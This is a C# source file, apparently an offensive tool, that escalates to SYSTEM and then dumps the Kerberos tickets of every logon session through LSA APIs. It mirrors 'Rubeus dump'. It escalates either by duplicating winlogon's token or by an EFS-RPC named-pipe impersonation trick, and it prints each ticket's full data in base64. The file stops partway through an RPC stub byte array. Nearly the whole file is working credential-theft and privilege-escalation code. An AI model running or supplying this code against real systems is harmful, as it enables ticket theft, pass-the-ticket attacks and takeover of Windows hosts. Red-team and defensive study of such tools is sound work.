using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.ComponentModel;
using System.Threading;

// Kerberos ticket dumper that performs the same behavoir as `Rubeus.exe dump`
// Based on Rubeus code: https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs
// Also based on PowerShellKerberos dumper.ps1: https://github.com/MzHmO/PowershellKerberos/blob/main/dumper.ps1
// Thx to Skyler Knecht and ChatGPT for doing most of the work


namespace TicketExtract
{
    public class Program
    {

        // LsaLookupAuthenticationPackage
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_IN
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public string Buffer;
        }

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaLookupAuthenticationPackage(
            [In] IntPtr LsaHandle,
            [In] ref LSA_STRING_IN PackageName,
            [Out] out int AuthenticationPackage
        );

        // LsaConnectUntrusted

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaConnectUntrusted(
            [Out] out IntPtr LsaHandle
        );

        // RevertToSelf

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        public static void Main(string[] args)
        {
            try
            {
                // Elevate to NT AUTHORITY\SYSTEM
                if (IsAdministrator())
                {
                    if(!Elevate() && !Efs.Elevate_efs())
                    {
                        return;
                    }
                }
                else // not administrator
                {
                    if (!Efs.Elevate_efs())
                    {
                        return;
                    }
                }

                // Get handle to LSA
                IntPtr lsaHandle = IntPtr.Zero;
                if (LsaConnectUntrusted(out lsaHandle) != 0)
                {
                    Console.WriteLine("[!] LsaConnectUntrusted failed");
                    RevertToSelf();
                    return;
                }

                // Get unique identifier for Kerberos authentication package

                int kerberosAuthenticationPackageIdentifier;
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                if (LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out kerberosAuthenticationPackageIdentifier) != 0)
                {
                    Console.WriteLine("[!] LsaLookupAuthenticationPackage failed");
                    RevertToSelf();
                    return;
                }

                // Grab tickets for each Logon Session
                if (GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier))
                {
                    // Maybe error here?
                    return;
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Unhandled exception:");
                Console.WriteLine(ex.ToString());
                RevertToSelf();
                return;
            }
        }

        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        // Elevate 
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle
        );

        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(
            IntPtr hObject
        );

        public static bool Elevate()
        {
            // Check if we are already SYSTEM first
            var currentSid = WindowsIdentity.GetCurrent().User;
            if (currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid))
            {
                return true;
            }

            Process[] processes = Process.GetProcessesByName("winlogon");
            IntPtr handle = processes[0].Handle;

            IntPtr hToken = IntPtr.Zero;
            bool errno = OpenProcessToken(handle, 0x0002, out hToken);
            if (!errno)
            {
                Console.WriteLine("[!] OpenProcessToken failed");
                return false;
            }

            IntPtr hDupToken = IntPtr.Zero;
            errno = DuplicateToken(hToken, 2, ref hDupToken);
            if (!errno)
            {
                Console.WriteLine("[!] DuplicateToken failed");
                return false;
            }

            errno = ImpersonateLoggedOnUser(hDupToken);
            if (!errno)
            {
                Console.WriteLine("[!] ImpersonateLoggedOnUser failed");
                return false;
            }

            // clean up the handles we created
            CloseHandle(hToken);
            CloseHandle(hDupToken);

            currentSid = WindowsIdentity.GetCurrent().User;
            if (!currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid))
            {
                return false;
            }

            return true;
        }

        // GetLogonSessionLUIDs
        [DllImport("secur32.dll")]
        public static extern int LsaEnumerateLogonSessions(out int logonSessionCount, out IntPtr logonSessionList);

        [DllImport("secur32.dll")]
        public static extern int LsaGetLogonSessionData(IntPtr logonSessionData, out IntPtr ppLogonSessionData);

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING
        {
            public ushort Length; // Length of the string
            public ushort MaximumLength; // Maximum length of the string
            public IntPtr Buffer; // Pointer to the string buffer
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_LOGON_SESSION_DATA
        {
            public uint Size;
            public LUID LogonId;
            public LSA_STRING_OUT UserName;
            public LSA_STRING_OUT LogonDomain;
            public LSA_STRING_OUT AuthenticationPackage;
            public uint LogonType;
            public uint Session;
            public IntPtr Sid;
            public long LogonTime;
            public LSA_STRING_OUT LogonServer;
            public LSA_STRING_OUT DnsDomainName;
            public LSA_STRING_OUT Upn;
        }

        [DllImport("secur32.dll")]
        public static extern int LsaFreeReturnBuffer(IntPtr buffer);

        private static List<LogonSessionData> GetLogonSessions()
        {
            List<LogonSessionData> sessionDataList = new List<LogonSessionData>();

            int logonSessionCount;
            IntPtr logonSessionList;

            // Enumerate logon sessions
            int result = LsaEnumerateLogonSessions(out logonSessionCount, out logonSessionList);
            if (result != 0)
            {
                throw new Exception("Error enumerating logon sessions: " + result);
            }

            IntPtr currentLogonSession = logonSessionList;

            for (int i = 0; i < logonSessionCount; i++)
            {
                SECURITY_LOGON_SESSION_DATA sessionDataUnsafe;

                result = LsaGetLogonSessionData(currentLogonSession, out IntPtr pSessionData);
                if (result != 0)
                {
                    throw new Exception("Error getting logon session data: " + result);
                }

                sessionDataUnsafe = Marshal.PtrToStructure<SECURITY_LOGON_SESSION_DATA>(pSessionData);
                LogonSessionData logonSessionData = new LogonSessionData()
                {
                    AuthenticationPackage = Marshal.PtrToStringUni(sessionDataUnsafe.AuthenticationPackage.Buffer, sessionDataUnsafe.AuthenticationPackage.Length / 2),
                    DnsDomainName = Marshal.PtrToStringUni(sessionDataUnsafe.DnsDomainName.Buffer, sessionDataUnsafe.DnsDomainName.Length / 2),
                    LogonDomain = Marshal.PtrToStringUni(sessionDataUnsafe.LogonDomain.Buffer, sessionDataUnsafe.LogonDomain.Length / 2),
                    LogonID = sessionDataUnsafe.LogonId,
                    LogonTime = DateTime.FromFileTime((long)sessionDataUnsafe.LogonTime),
                    //LogonTime = systime.AddTicks((long)unsafeData.LoginTime),
                    LogonServer = Marshal.PtrToStringUni(sessionDataUnsafe.LogonServer.Buffer, sessionDataUnsafe.LogonServer.Length / 2),
                    LogonType = (int)sessionDataUnsafe.LogonType,
                    Sid = (sessionDataUnsafe.Sid == IntPtr.Zero ? null : new SecurityIdentifier(sessionDataUnsafe.Sid)),
                    Upn = Marshal.PtrToStringUni(sessionDataUnsafe.Upn.Buffer, sessionDataUnsafe.Upn.Length / 2),
                    Session = (int)sessionDataUnsafe.Session,
                    Username = Marshal.PtrToStringUni(sessionDataUnsafe.UserName.Buffer, sessionDataUnsafe.UserName.Length / 2),
                };
                sessionDataList.Add(logonSessionData);

                // Free the memory allocated for session data
                LsaFreeReturnBuffer(pSessionData);

                currentLogonSession = (IntPtr)((long)currentLogonSession + Marshal.SizeOf(typeof(LUID)));
            }

            // Free the memory allocated for the logon session list
            LsaFreeReturnBuffer(logonSessionList);

            return sessionDataList;
        }

        // GetTickets
        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public int MessageType;
            public int NumberOfTickets;
            public IntPtr Tickets;
        }

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            int AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus
        );

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_OUT
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_TICKET_CACHE_INFO_EX
        {
            public LSA_STRING_OUT ClientName;
            public LSA_STRING_OUT ClientRealm;
            public LSA_STRING_OUT ServerName;
            public LSA_STRING_OUT ServerRealm;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewTime;
            public Int32 EncryptionType;
            public UInt32 TicketFlags;
        }

        [Flags]
        public enum TicketFlags : UInt32
        {
            reserved = 2147483648,
            forwardable = 0x40000000,
            forwarded = 0x20000000,
            proxiable = 0x10000000,
            proxy = 0x08000000,
            may_postdate = 0x04000000,
            postdated = 0x02000000,
            invalid = 0x01000000,
            renewable = 0x00800000,
            initial = 0x00400000,
            pre_authent = 0x00200000,
            hw_authent = 0x00100000,
            ok_as_delegate = 0x00040000,
            anonymous = 0x00020000,
            name_canonicalize = 0x00010000,
            //cname_in_pa_data = 0x00040000,
            enc_pa_rep = 0x00010000,
            reserved1 = 0x00000001,
            empty = 0x00000000
            // TODO: constrained delegation?
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_STRING_OUT DomainName;
            public LSA_STRING_OUT TargetDomainName;
            public LSA_STRING_OUT AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public UInt32 TicketFlags;
            public UInt32 Flags;
            public Int64 KeyExpirationTime;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewUntil;
            public Int64 TimeSkew;
            public Int32 EncodedTicketSize;
            public IntPtr EncodedTicket;
        }

        public class LogonSessionData
        {
            public LUID LogonID;
            public string Username;
            public string LogonDomain;
            public string AuthenticationPackage;
            public int LogonType;
            public int Session;
            public SecurityIdentifier Sid;
            public DateTime LogonTime;
            public string LogonServer;
            public string DnsDomainName;
            public string Upn;
        }

        public class KRB_TICKET
        {
            // contains cache info (i.e. KERB_TICKET_CACHE_INFO_EX) and the full .kirbi
            public string ClientName;
            public string ClientRealm;
            public string ServerName;
            public string ServerRealm;
            public DateTime StartTime;
            public DateTime EndTime;
            public DateTime RenewTime;
            public Int32 EncryptionType;
            public TicketFlags TicketFlags;
            public byte[] TicketData;
        }

        private static bool GetTickets(IntPtr lsaHandle, int kerberosAuthenticationPackageIdentifier)
        {
            foreach (LogonSessionData logonSession in GetLogonSessions())
            {

                // Make Request to LSA

                KERB_QUERY_TKT_CACHE_REQUEST kerbQueryTKTCacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();

                kerbQueryTKTCacheRequest.MessageType = 14; // 14 is KerbQueryTicketCacheExMessage
                kerbQueryTKTCacheRequest.LogonId = logonSession.LogonID;

                var kerbQueryTKTCacheRequestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(kerbQueryTKTCacheRequest));
                Marshal.StructureToPtr(kerbQueryTKTCacheRequest, kerbQueryTKTCacheRequestPtr, false);

                var ticketsPointer = IntPtr.Zero;
                var returnBufferLength = 0;
                var protocalStatus = 0;

                if (LsaCallAuthenticationPackage(
                    lsaHandle,
                    kerberosAuthenticationPackageIdentifier,
                    kerbQueryTKTCacheRequestPtr, Marshal.SizeOf(kerbQueryTKTCacheRequest),
                    out ticketsPointer,
                    out returnBufferLength,
                    out protocalStatus) != 0)
                {
                    Console.WriteLine("[!] LsaCallAuthenticationPackage failed");
                    return false;
                }

                // Parse Response from LSA

                KERB_QUERY_TKT_CACHE_RESPONSE kerbQueryTKTCacheResponse = new KERB_QUERY_TKT_CACHE_RESPONSE();

                if (ticketsPointer == IntPtr.Zero)
                {
                    Console.WriteLine($"[*] Failed to obtain ticketsPointer for {logonSession.LogonID.LowPart}");
                    continue;
                }

                kerbQueryTKTCacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(ticketsPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                int numberOfTickets = kerbQueryTKTCacheResponse.NumberOfTickets;

                if (numberOfTickets == 0)
                {
                    Console.WriteLine($"[*] No tickets for {logonSession.LogonID.LowPart}");
                    continue;
                }

                var dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO_EX));

                for (int i = 0; i < numberOfTickets; i++)
                {
                    IntPtr ticketPtr = (IntPtr)(ticketsPointer.ToInt64() + (8 + i * dataSize)); // Thanks SpectreOps for doing this math <3

                    KERB_TICKET_CACHE_INFO_EX ticketCacheResult = (KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(ticketPtr, typeof(KERB_TICKET_CACHE_INFO_EX));

                    KRB_TICKET ticket = new KRB_TICKET();
                    ticket.StartTime = DateTime.FromFileTime(ticketCacheResult.StartTime);
                    ticket.EndTime = DateTime.FromFileTime(ticketCacheResult.EndTime);
                    ticket.RenewTime = DateTime.FromFileTime(ticketCacheResult.RenewTime);
                    ticket.TicketFlags = (TicketFlags)ticketCacheResult.TicketFlags;
                    ticket.EncryptionType = ticketCacheResult.EncryptionType;
                    ticket.ServerName = Marshal.PtrToStringUni(ticketCacheResult.ServerName.Buffer, ticketCacheResult.ServerName.Length / 2);
                    ticket.ServerRealm = Marshal.PtrToStringUni(ticketCacheResult.ServerRealm.Buffer, ticketCacheResult.ServerRealm.Length / 2);
                    ticket.ClientName = Marshal.PtrToStringUni(ticketCacheResult.ClientName.Buffer, ticketCacheResult.ClientName.Length / 2);
                    ticket.ClientRealm = Marshal.PtrToStringUni(ticketCacheResult.ClientRealm.Buffer, ticketCacheResult.ClientRealm.Length / 2);
                    ticket.TicketData = ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, kerbQueryTKTCacheRequest.LogonId, ticket.ServerName);

                    Console.WriteLine("Username        : " + logonSession.Username);
                    Console.WriteLine("UPN             : " + logonSession.Upn);
                    Console.WriteLine("SID             : " + logonSession.Sid);
                    Console.WriteLine("Session         : " + logonSession.Session);
                    Console.WriteLine("Logon Server    : " + logonSession.LogonServer);
                    Console.WriteLine("Logon Domain    : " + logonSession.LogonDomain);
                    Console.WriteLine("Logon Time      : " + logonSession.LogonTime);
                    Console.WriteLine("Logon Type      : " + logonSession.LogonType);
                    Console.WriteLine("Auth Package    : " + logonSession.AuthenticationPackage);
                    Console.WriteLine("----------------:");
                    Console.WriteLine("Start Time      : " + ticket.StartTime);
                    Console.WriteLine("End Time        : " + ticket.EndTime);
                    Console.WriteLine("Renew Time      : " + ticket.RenewTime);
                    Console.WriteLine("Ticket Flags    : " + ticket.TicketFlags);
                    Console.WriteLine("Encryption Type : " + ticket.EncryptionType);
                    Console.WriteLine("Server Name     : " + ticket.ServerName);
                    Console.WriteLine("Server Realm    : " + ticket.ServerRealm);
                    Console.WriteLine("Client Name     : " + ticket.ClientRealm);
                    Console.WriteLine("Ticket Data     : " + Convert.ToBase64String(ticket.TicketData));
                    Console.WriteLine("================================================================");
                }
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
            public UNICODE_STRING TargetName;
            public uint TicketFlags;
            public uint CacheOptions;
            public int EncryptionType;
            public SECURITY_HANDLE CredentialsHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CRYPTO_KEY
        {
            public int KeyType;
            public int Length;
            public IntPtr Value;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }

        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
        public static extern void CopyMemory(
            IntPtr dest,
            IntPtr src,
            uint count
        );

        public static byte[] ExtractTickets(IntPtr lsaHandle, int kerberosAuthenticationPackageIdentifier, LUID LogonId, string serverName)
        {
            var request = new KERB_RETRIEVE_TKT_REQUEST();
            KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();
            var responsePointer = IntPtr.Zero;
            var returnBufferLength = 0;
            var protocolStatus = 0;

            // Initialize request
            request.MessageType = 0x8;
            request.LogonId = LogonId;
            request.TicketFlags = 0x0; // Use default ticket flags
            request.CacheOptions = 0x8; // Use KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
            request.EncryptionType = 0x0; // Use default encryption type

            // Set target name
            var targetName = new UNICODE_STRING(serverName);
            request.TargetName = targetName;

            // Allocate memory for the request
            int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST)) + targetName.MaximumLength;
            var requestPtr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(request, requestPtr, false);

            // Update target name buffer pointer
            IntPtr targetNameBufferPtr = (IntPtr)((long)requestPtr + Marshal.SizeOf(request));
            CopyMemory(targetNameBufferPtr, targetName.buffer, targetName.MaximumLength);
            Marshal.WriteIntPtr(requestPtr, IntPtr.Size == 8 ? 24 : 16, targetNameBufferPtr);

            // Call LsaCallAuthenticationPackage
            int resultCode = LsaCallAuthenticationPackage(lsaHandle, kerberosAuthenticationPackageIdentifier, requestPtr, structSize, out responsePointer, out returnBufferLength, out protocolStatus);

            // Handle response
            if (resultCode == 0 && responsePointer != IntPtr.Zero && returnBufferLength != 0)
            {
                response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));
                int encodedTicketSize = response.Ticket.EncodedTicketSize;
                byte[] encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);

                // Console.WriteLine($"Successfully extracted ticket for {serverName}");
                // Console.WriteLine(Convert.ToBase64String(encodedTicket)); // console writeline the encodedTicket 
                // Remember to free any allocated resources
                LsaFreeReturnBuffer(responsePointer);
                Marshal.FreeHGlobal(requestPtr);

                return encodedTicket;
            }
            else
            {
                Console.WriteLine($"Failed to extract ticket for {serverName}. ResultCode: {resultCode}, ProtocolStatus: {protocolStatus}");

                // Clean up on failure
                if (responsePointer != IntPtr.Zero) LsaFreeReturnBuffer(responsePointer);
                Marshal.FreeHGlobal(requestPtr);

                return null;
            }
        }
    }

    // Additional code from EfSystem to elevate to SYSTEM using EFS (same as Meterpreter getsystem -t 6)
    public class Efs
    {
        public static bool Elevate_efs()
        {
            string[] pipes = { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" };
            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                Console.WriteLine("[*] Current user: " + wi.Name);
                LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine("[-] SeImpersonatePrivilege not held.");
                    return false;
                }
            }
            string g = Guid.NewGuid().ToString("d");
            string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hPipe = CreateNamedPipe(fake, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[-] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            ManualResetEvent mre = new ManualResetEvent(false);
            var tn = new Thread(NamedPipeThread);
            tn.IsBackground = true;
            tn.Start(new object[] { hPipe, mre });
            var tn2 = new Thread(RpcThread);
            tn2.IsBackground = true;
            foreach (string pipe in pipes)
            {
                tn2.Start(new object[] { g, pipe });
                if (mre.WaitOne(3000))
                {
                    if (ImpersonateNamedPipeClient(hPipe))
                    {
                        IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                        Console.WriteLine("[+] Got Token: " + tkn);
                        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                        sa.nLength = Marshal.SizeOf(sa);
                        sa.pSecurityDescriptor = IntPtr.Zero;
                        sa.bInheritHandle = 1;
                        IntPtr hRead, hWrite;
                        CreatePipe(out hRead, out hWrite, ref sa, 1024);

                        // get SYSTEM for the current process using token impersonation
                        if (!ImpersonateLoggedOnUser(tkn))
                        {
                            Console.WriteLine("[-] Could not ImpersonateLoggedOnUser. Error: " + Marshal.GetLastWin32Error());
                        }
                        else
                        {
                            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                            {
                                Console.WriteLine("[+] ImpersonateLoggedOnUser successful! Current user: " + wi.Name);
                            }
                            var identity = new WindowsIdentity(tkn);
                            WindowsImpersonationContext impersonatedUser = identity.Impersonate();
                            CloseHandle(hPipe);
                            return true;
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error! Operation timed out");
                    CreateFile(fake, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);//force cancel async operation
                }
            }
            CloseHandle(hPipe);
            return false;
        }
        static void ReadThread(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }
        static void RpcThread(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;
            EfsrTiny r = new EfsrTiny(p);
            try
            {
                r.EfsRpcEncryptFileSrv("\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void NamedPipeThread(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                ConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }
        #region pinvoke
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        //just copy-paste from stackoverflow,pinvoke.net,etc
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr pSecurityDescriptor;
            public int bInheritHandle;
        }
        #endregion
    }
    //copy from bcl
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    //this code just copy-paste from gist
    //orig class: rprn
    //some changed for MS-EFSR
    class EfsrTiny
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);

        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };

